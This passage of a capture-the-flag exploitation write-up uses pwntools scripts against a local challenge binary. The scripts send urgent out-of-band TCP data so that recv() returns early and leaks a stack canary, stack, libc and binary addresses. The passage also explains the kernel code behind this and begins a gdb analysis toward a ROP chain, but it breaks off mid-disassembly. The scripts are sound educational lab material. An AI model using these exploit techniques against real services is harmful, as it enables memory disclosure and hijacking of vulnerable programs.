</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(p64(</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">1ff</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;A&#39;</span><span style="--0:#BF3441;--1:#F97583">*0x</span><span style="--0:#005CC5;--1:#79B8FF">100</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.sock.send(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;!&#39;</span><span style="--0:#24292E;--1:#E1E4E8">, socket.</span><span style="--0:#005CC5;--1:#79B8FF">MSG_OOB</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#!/usr/bin/env python3from pwn import *import socketr = remote('localhost', 31337)r.send(p64(0x1ff))r.send(b'A'*0x100)r.sock.send(b'!', socket.MSG_OOB)r.interactive()"><div></div></button></div></figure></div>
<p><img src="/other-files/leaks.D209yc7T_ZkVO92.webp" alt width="1913" height="648" loading="lazy" decoding="async"></p>
<p>As we can see, running this script returns <code>0x1ff</code> bytes of data, where the first <code>0x100</code> bytes are our As and the remaining bytes are uninitialized memory.</p>
<p>The only thing that changed between our normal interaction and this script that magically makes <code>recv()</code> return early is this line:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:33ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.sock.send(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;!&#39;</span><span style="--0:#24292E;--1:#E1E4E8">, socket.</span><span style="--0:#005CC5;--1:#79B8FF">MSG_OOB</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="r.sock.send(b'!', socket.MSG_OOB)"><div></div></button></div></figure></div>
<p>Looking at the man-pages of <code>send()</code>, it sends out of band data on sockets.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="text" class="wrap" style="--ecMaxLine:64ch"><code><div class="ec-line"><div class="code"><span style="--0:#24292e;--1:#e1e4e8">MSG_OOB</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">      </span></span><span style="--0:#24292e;--1:#e1e4e8">Sends out-of-band data on sockets that support this notion</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">      </span></span><span style="--0:#24292e;--1:#e1e4e8">(e.g., of type SOCK_STREAM); the underlying protocol must</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">      </span></span><span style="--0:#24292e;--1:#e1e4e8">also support out-of-band data.</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="MSG_OOB      Sends out-of-band data on sockets that support this notion      (e.g., of type SOCK_STREAM); the underlying protocol must      also support out-of-band data."><div></div></button></div></figure></div>
<p>Let’s add a <code>pause()</code> statement before the <code>r.sock.send()</code> and analyze the packet in wireshark.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:33ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">#!/usr/bin/env python3</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> pwn </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> socket</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> remote(</span><span style="--0:#032F62;--1:#9ECBFF">&#39;localhost&#39;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">31337</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(p64(</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">1ff</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;A&#39;</span><span style="--0:#BF3441;--1:#F97583">*0x</span><span style="--0:#005CC5;--1:#79B8FF">100</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">pause()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.sock.send(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;!&#39;</span><span style="--0:#24292E;--1:#E1E4E8">, socket.</span><span style="--0:#005CC5;--1:#79B8FF">MSG_OOB</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#!/usr/bin/env python3from pwn import *import socketr = remote('localhost', 31337)r.send(p64(0x1ff))r.send(b'A'*0x100)pause()r.sock.send(b'!', socket.MSG_OOB)r.interactive()"><div></div></button></div></figure></div>
<p>Run the above script and open up wireshark. Start capturing over the loopback (lo) interface, then press enter in the terminal window. Go back to wireshark and use this filter to parse the relevant traffic being sent to the server:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="text" class="wrap" style="--ecMaxLine:20ch"><code><div class="ec-line"><div class="code"><span style="--0:#24292e;--1:#e1e4e8">tcp.dstport == 31337</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="tcp.dstport == 31337"><div></div></button></div></figure></div>
<p><img src="/other-files/wireshark.CZJzugxw_kJcEl.webp" alt width="1917" height="900" loading="lazy" decoding="async"></p>
<p>We can see two packets where the first one stands out because it has interesting flags including <code>PSH</code>, <code>ACK</code>, and <code>URG</code>. The <code>URG</code> flag is particularly notable because of ptr-yudai’s hint that “you can interrupt recv by sending an URGENT TCP packet”.</p>
<p>Looking at the TCP packet structure, we can identify two relevant fields: the flags and the urgent pointer.</p>
<p><img src="https://intronetworks.cs.luc.edu/current/uhtml/_images/tcp_header.svg" alt/></p>
<p>We can easily find these fields in our packet. The flags field has the URG flag enabled, and the urgent pointer is set to <code>1</code>, which corresponds to <code>!</code> — the character we were trying to send.</p>
<p><img src="/other-files/packet.DhGVEvCA_2vUAdo.webp" alt width="1920" height="366" loading="lazy" decoding="async"></p>
<p>Well, enough of packet analysis — let’s jump into why this works and look at the kernel source code. For those of you who want to learn more about urgent TCP packet, you can watch <a href="https://www.youtube.com/watch?v=zFrB5NytXWo" rel="nofollow noreferrer noopener" target="_blank">this</a> video.</p>
<p>The main function handling recv() at the tcp protocol level is <code>tcp_recvmsg_locked()</code>. When you call recv() in userspace, the execution flow looks like this:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="text" class="wrap" style="--ecMaxLine:59ch"><code><div class="ec-line"><div class="code"><span style="--0:#24292e;--1:#e1e4e8">usercode: recv(...)</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">   </span></span><span style="--0:#24292e;--1:#e1e4e8">→ glibc syscall wrapper</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">      </span></span><span style="--0:#24292e;--1:#e1e4e8">→ kernel: sys_recvfrom / sys_recvmsg</span></div></div><div class="ec-line" style="--ecIndent:9ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">         </span></span><span style="--0:#24292e;--1:#e1e4e8">→ socket layer: sock_recvmsg() / ___sys_recvfrom()</span></div></div><div class="ec-line" style="--ecIndent:12ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">            </span></span><span style="--0:#24292e;--1:#e1e4e8">→ protocol (TCP) recvmsg → tcp_recvmsg()</span></div></div><div class="ec-line" style="--ecIndent:15ch"><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">               </span></span><span style="--0:#24292e;--1:#e1e4e8">→ tcp_recvmsg_locked()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="usercode: recv(...)   → glibc syscall wrapper      → kernel: sys_recvfrom / sys_recvmsg         → socket layer: sock_recvmsg() / ___sys_recvfrom()            → protocol (TCP) recvmsg → tcp_recvmsg()               → tcp_recvmsg_locked()"><div></div></button></div></figure></div>
<p>Looking at the <a href="https://github.com/torvalds/linux/blob/master/net/ipv4/tcp.c#L2634" rel="nofollow noreferrer noopener" target="_blank">source code</a> of <code>tcp_recvmsg_locked()</code> we can see this if statement that breaks out of the <code>do-while</code> loop if the kernel is at urgent data.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:86ch"><code><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* Are we at urgent data? Stop if we have read anything or have SIGURG pending. */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">unlikely</span><span style="--0:#24292E;--1:#E1E4E8">(tp</span><span style="--0:#BF3441;--1:#F97583">-&gt;</span><span style="--0:#AE4B07;--1:#FFAB70">urg_data</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">&amp;&amp;</span><span style="--0:#24292E;--1:#E1E4E8"> tp</span><span style="--0:#BF3441;--1:#F97583">-&gt;</span><span style="--0:#24292E;--1:#E1E4E8">urg_seq </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">seq) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (copied)</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">break</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">signal_pending</span><span style="--0:#24292E;--1:#E1E4E8">(current)) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">copied </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> timeo </span><span style="--0:#BF3441;--1:#F97583">?</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">sock_intr_errno</span><span style="--0:#24292E;--1:#E1E4E8">(timeo) </span><span style="--0:#BF3441;--1:#F97583">:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8">EAGAIN;</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">break</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="    /* Are we at urgent data? Stop if we have read anything or have SIGURG pending. */    if (unlikely(tp->urg_data) &#38;&#38; tp->urg_seq == *seq) {      if (copied)        break;      if (signal_pending(current)) {        copied = timeo ? sock_intr_errno(timeo) : -EAGAIN;        break;      }    }"><div></div></button></div></figure></div>
<p>So, that’s why if we send urgent-data we can make <code>recv()</code> return early! Now that we have that out of the way let’s get into the real exploitation part.</p>
<p>The buffer is 0x100 bytes, so the canary, rbp, and rip must be after that! Let’s fill the buffer with AAAAs, send a URG packet to make <code>recv()</code> return early, remove the first 0x100 bytes (which are just our AAAAs), and then parse the canary, stack, and libc leaks.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:48ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">#!/usr/bin/env python3</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> pwn </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> socket</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">exe  </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> context.binary </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ELF(</span><span style="--0:#032F62;--1:#9ECBFF">&#39;./chall&#39;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">libc </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ELF(exe.libc.path)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> remote(</span><span style="--0:#032F62;--1:#9ECBFF">&#39;localhost&#39;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">31337</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(p64(</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">1ff</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;A&#39;</span><span style="--0:#BF3441;--1:#F97583">*0x</span><span style="--0:#005CC5;--1:#79B8FF">100</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.sock.send(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;!&#39;</span><span style="--0:#24292E;--1:#E1E4E8">, socket.</span><span style="--0:#005CC5;--1:#79B8FF">MSG_OOB</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">leaks         </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> r.recv(</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">1ff</span><span style="--0:#24292E;--1:#E1E4E8">)[</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">100</span><span style="--0:#24292E;--1:#E1E4E8">:]</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">stack         </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(leaks[</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">:</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">]) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">1f0</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">canary        </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(leaks[</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">:</span><span style="--0:#005CC5;--1:#79B8FF">16</span><span style="--0:#24292E;--1:#E1E4E8">])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">libc.address  </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(leaks[</span><span style="--0:#005CC5;--1:#79B8FF">24</span><span style="--0:#24292E;--1:#E1E4E8">:</span><span style="--0:#005CC5;--1:#79B8FF">32</span><span style="--0:#24292E;--1:#E1E4E8">]) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">2a1ca</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">exe.address   </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(leaks[</span><span style="--0:#005CC5;--1:#79B8FF">56</span><span style="--0:#24292E;--1:#E1E4E8">:</span><span style="--0:#005CC5;--1:#79B8FF">64</span><span style="--0:#24292E;--1:#E1E4E8">]) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> exe.sym.main</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#!/usr/bin/env python3from pwn import *import socketexe  = context.binary = ELF('./chall')libc = ELF(exe.libc.path)r = remote('localhost', 31337)r.send(p64(0x1ff))r.send(b'A'*0x100)r.sock.send(b'!', socket.MSG_OOB)leaks         = r.recv(0x1ff)[0x100:]stack         = u64(leaks[0:8]) - 0x1f0canary        = u64(leaks[8:16])libc.address  = u64(leaks[24:32]) - 0x2a1caexe.address   = u64(leaks[56:64]) - exe.sym.mainr.interactive()"><div></div></button></div></figure></div>
<p>Now that we have all the leaks, we can exploit the buffer overflow by overwriting rip with a custom ROP chain!</p>
<p>To understand how the stack frame looks, let’s run the binary in gdb, add a breakpoint on <code>recv()</code>, run the script, and analyze the stack layout when the breakpoint hits.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:308ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">gdb</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">-q</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">disas</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">main</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Dump</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">of</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">assembler</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">code</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">for</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">function</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">main:</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00000000000012c9</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+0&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#032F62;--1:#9ECBFF">endbr64</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00000000000014f9</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+560&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">ecx,0x100</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00000000000014fe</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+565&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">edi,eax</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x0000000000001500</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+567&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">call</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">0x1110</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;recv@plt&gt;</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x0000000000001505</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+572&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">rax,QWORD</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">PTR</span><span style="--0:#24292E;--1:#E1E4E8"> [rbp-0x138]</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x000000000000150c</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+579&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">rdx,rax</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x000000000000150f</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+582&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">lea</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">rsi,[rbp-0x110]</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x0000000000001516</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+589&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">eax,DWORD</span><span 